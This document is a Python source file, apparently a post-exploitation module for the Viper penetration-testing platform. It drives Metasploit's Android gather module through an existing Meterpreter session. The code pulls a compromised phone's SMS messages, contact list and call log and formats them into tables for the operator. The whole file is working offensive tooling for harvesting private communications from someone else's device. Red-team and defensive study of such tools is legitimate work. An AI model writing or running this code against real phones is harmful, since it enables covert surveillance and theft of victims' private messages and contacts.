# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "获取目标手机短信/通话记录/通讯录"
    DESC_ZH = "获取目标手机短信/通话记录/通讯录(Android)\n"

    NAME_EN = "Get target SMS/Call record/Contact book"
    DESC_EN = "Get target SMS/Call record/Contact book(Android).\n"
    MODULETYPE = TAG2TYPE.Discovery
    PLATFORM = ["Android"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = []
    REFERENCES = []
    AUTHOR = ["Viper"]
    REQUIRE_SESSION = True

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "android/gather/android_call_info"

    def check(self):
        """执行前的检查函数"""
        self.session = Session(self._sessionid)
        if self.session.platform.lower().startswith('android') is not True:
            return False, "模块只支持Android平台的Meterpreter", "Module only supports Meterpreter for Android"
        return True, None

    def handle_sms(self, data):
        data_zh = []
        data_en = []
        sms_type_zh = {"1": "接收", "2": "发送"}
        sms_type_en = {"1": "Receive", "2": "Send"}
        sms_list = data.get("sms_list", [])
        self.log_good(" ---- 短信列表 ----", " ---- SMS List ----")
        for one in sms_list:
            type = one.get("type")
            address = one.get("address")
            body = one.get("body")
            date = self.timestamp_to_str(int(one.get("date")) / 1000)
            data_zh.append(
                {
                    "Address": address,
                    "Body": body,
                    "Date": date,
                    "Type": sms_type_zh.get(type),
                }
            )
            data_en.append(
                {
                    "Address": address,
                    "Body": body,
                    "Date": date,
                    "Type": sms_type_en.get(type),
                }
            )
        self.log_table(data_zh, data_en)

    def handle_contact(self, data):
        data_zh = []
        data_en = []

        contact_list = data.get("contact_list", [])
        self.log_good(" ---- 联系人列表 ----", " ---- Contact List ----")
        for one in contact_list:
            name = one.get("name")
            number = ",".join(one.get("number"))
            data_zh.append(
                {
                    "联系人": name,
                    "电话号码": number,
                }
            )
            data_en.append(
                {
                    "Name": name,
                    "Number": number,
                }
            )
        self.log_table(data_zh, data_en)

    def handle_calllog(self, data):
        data_zh = []
        data_en = []
        sms_list = data.get("calllog_list", [])
        self.log_good(" ---- 通话记录 ----", " ---- Call Log ----")
        for one in sms_list:
            name = one.get("name")
            number = one.get("number")
            date = one.get("date")
            duration = one.get("duration")
            type = one.get("type")
            data_zh.append(
                {
                    "Number": number,
                    "Date": date,
                    "Duration": duration,
                    "Type": type,
                }
            )
            data_en.append(
                {
                    "Number": number,
                    "Date": date,
                    "Duration": duration,
                    "Type": type,
                }
            )
        self.log_table(data_zh, data_en)

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return
        try:
            self.handle_contact(data)
            self.handle_sms(data)
            self.handle_calllog(data)

        except Exception as E:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_except(str(E), str(E))
